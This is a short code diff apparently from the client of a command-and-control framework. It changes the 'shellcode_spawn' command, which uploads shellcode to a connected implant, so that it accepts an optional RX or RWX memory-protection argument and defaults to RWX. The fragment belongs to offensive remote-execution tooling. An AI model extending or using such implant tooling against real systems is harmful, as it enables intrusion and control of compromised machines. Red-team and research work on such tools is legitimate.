@@ -190,7 +190,11 @@ def cmd_shellcode_inject(args: List[str], app):
 # into it, same client -> server -> implant transfer method as shellcode_inject
 def cmd_shellcode_spawn(args: List[str], app):
     # Must be 2 args
-    client_errors.arg_len_error(args, 2, 2)
+    client_errors.arg_len_error(args, max=3, min=2)
+
+    if len(args) == 3:
+        if args[2] != "RX" and args[2] != "RWX":
+            raise client_errors.CommandDoesntExist
 
     # Error if not connected to implant
     if not connected_to_implant():
@@ -203,7 +207,11 @@ def cmd_shellcode_spawn(args: List[str], app):
     cmd_id = encryption.id_generator(N=32)
 
     # Create the command string
-    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN, [file_id]) 
+    # If no specification of memory protection, default to RWX
+    if len(args) == 2:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN, [file_id, "RWX"]) 
+    else:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN, [file_id, args[2]]) 
 
     # Post the file, if it doesn't exist, will raise FileDoesntExist exception
     uploaded_filename = post_file_command(file_path=args[1],
